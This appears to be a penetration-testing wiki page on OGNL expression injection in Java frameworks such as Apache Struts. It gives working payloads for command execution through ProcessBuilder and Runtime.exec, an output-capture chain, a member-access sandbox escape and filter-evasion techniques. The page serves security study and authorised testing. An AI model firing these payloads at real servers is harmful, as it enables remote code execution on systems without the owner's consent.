---
title: "OGNL and object-graph expression injection: property navigation to Java RCE"
description: Exploiting OGNL and similar object-graph languages (MVEL, Apache Struts, commons-ognl) when HTTP input is evaluated as an expression, from property reads to constructor chains that reach Runtime.exec and reflection-based sandbox escapes.
keywords:
  - OGNL
  - OGNL injection
  - object-graph navigation language
  - Apache Struts
  - expression injection
  - remote code execution
---

# OGNL-style expressions

**OGNL** (Object-Graph Navigation Language) and its relatives, MVEL, Apache Commons OGNL, and the expression layers embedded in frameworks such as Apache Struts, were built to walk and manipulate Java object graphs with short strings: read a property, call a method, index a collection, construct an object. When one of those strings crosses a trust boundary and is handed to the engine's parser, the attacker gains a scripting foothold inside the JVM. Because the language can reference arbitrary classes and invoke methods, a property-navigation feature becomes a path to **remote code execution** as the application's service account.

## Overview

A vulnerable sink evaluates attacker-influenced data as an OGNL expression:

```java
// value derived from a request parameter
Object result = Ognl.getValue(userExpression, context, root);
```

The intended use is benign, resolve `user.profile.displayName` against a root object. OGNL, however, is a complete expression language. The same evaluator that resolves a property path will also honor `(new java.lang.ProcessBuilder(...)).start()`. The vulnerability is the familiar data-to-code crossing: the engine's grammar treats method calls and constructors as syntax, and the attacker controls the string.

Historically the most impactful instances were in **Apache Struts 2**, where OGNL is evaluated pervasively, parameter names, tag attributes, and notably the `ValueStack`, so expressions reached the engine through surfaces the developer never explicitly parsed. Several high-severity, widely exploited vulnerabilities in that framework were OGNL injections.

## The expression primitives

OGNL gives the attacker several building blocks once evaluation is reached:

| Construct | Example | Effect |
|-----------|---------|--------|
| Property navigation | `user.name` | Read/write fields and bean properties on the root |
| Method call | `user.getName()` | Invoke any accessible method |
| Static method | `@java.lang.System@getProperty('user.dir')` | Call a static method on a named class |
| Constructor | `new java.lang.ProcessBuilder('id')` | Instantiate arbitrary classes |
| Context variable | `#ctx`, `#root`, `#this` | Reference evaluation-context objects |
| Collection/list literal | `{'a','b'}` | Build arrays and lists for method arguments |

The `@class@member` syntax for statics and the `new` keyword for constructors are the two that turn navigation into execution. `#` references reach into the OGNL context map, which in framework settings often holds powerful objects.

## Exploitation

### Step 1, confirm evaluation

Before weaponizing, prove the string is evaluated rather than echoed. Arithmetic is the cleanest oracle because its result is unmistakable and side-effect free:

```
${7*7}
%{7*7}
(7*7)
```

A reflected `49` where `7*7` was submitted confirms the engine evaluated the expression. The `${...}` and `%{...}` wrappers correspond to common framework evaluation markers; which one fires tells you the sink.

### Step 2, reach the runtime

With evaluation confirmed, escalate to execution via constructors or static calls. The canonical chains:

```
# ProcessBuilder constructor
(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','id'})).start()

# Runtime via static accessor
@java.lang.Runtime@getRuntime().exec('id')
```

When output is not reflected, read it back explicitly by capturing the process stream, or fall back to a blind oracle, write to a web-served path, or trigger an out-of-band DNS/HTTP callback carrying the result.

### Step 3, capture command output

Reflecting the result inline makes an interactive oracle. A common pattern reads the process input stream and assigns it to a response-bound object in the evaluation context:

```
#p=new java.lang.ProcessBuilder({'id'}),#p.redirectErrorStream(true),#proc=#p.start(),
#out=new java.util.Scanner(#proc.getInputStream()).useDelimiter('\\A').next()
```

The comma operator chains statements; the final expression value is the captured output. In framework contexts the result is then placed onto the response writer pulled from the context map.

### Context-object escalation

In framework settings the OGNL context holds objects worth more than raw `exec`. Historically, expressions toggled security flags in the evaluation context, disabling method-access guards, re-enabling static method access, or clearing a members-access denylist, so that a payload otherwise blocked by the framework's OGNL sandbox would run. The pattern is: first manipulate the context's access controls through `#context[...]` or a `#_memberAccess` assignment, then invoke the previously forbidden constructor or static method.

```
#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
```

Reaching for the context's own guard objects is the recurring theme in OGNL sandbox escapes: the language is powerful enough to rewrite the restrictions placed on it.

## Filter evasion

Where a framework or WAF blocks obvious keywords, OGNL's flexibility supplies alternatives:

- **String concatenation to rebuild keywords:** `'java.lang.Ru'+'ntime'` fed to `@java.lang.Class@forName(...)` dodges a literal `Runtime` match.
- **Reflection instead of direct calls:** resolve a class with `Class.forName`, fetch a `Method` via `getMethod`, and `invoke` it, so no blocked method name appears as a direct call token.
- **Unicode and whitespace variants:** alternate separators and encodings slip past naive signature rules while the parser normalizes them.
- **Marker swapping:** if `%{...}` is filtered, `${...}` or bare expressions may still evaluate depending on the sink.

## Related engines

The same tradecraft transfers to other object-graph evaluators embedded in Java stacks:

- **MVEL**, used in some rule engines and templating; supports method calls and `new`, so property-rule injection reaches execution similarly.
- **Apache Commons OGNL / JXPath**, object-navigation libraries that, when fed user strings, expose comparable constructor and static-call reach.

When assessing any of these, the method is identical: confirm evaluation with arithmetic, enumerate whether constructors and static calls are reachable, then chain to the runtime.

## Tools

- **[Burp Suite](https://portswigger.net/burp)** (Repeater, Intruder) for probing parameters with arithmetic oracles and staged payloads.
- **[interactsh](https://github.com/projectdiscovery/interactsh)** / Burp Collaborator for out-of-band confirmation when output is not reflected.
- **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)** OGNL payload collections for context-escape and output-capture chains.
- Framework-version fingerprinting to map a target to the OGNL sandbox state of that release.

## References

- [CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)
- [Apache Struts Security Bulletins](https://struts.apache.org/security/)
- [OGNL Language Guide (Apache Commons OGNL)](https://commons.apache.org/proper/commons-ognl/language-guide.html)
- [PayloadsAllTheThings: Java OGNL injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
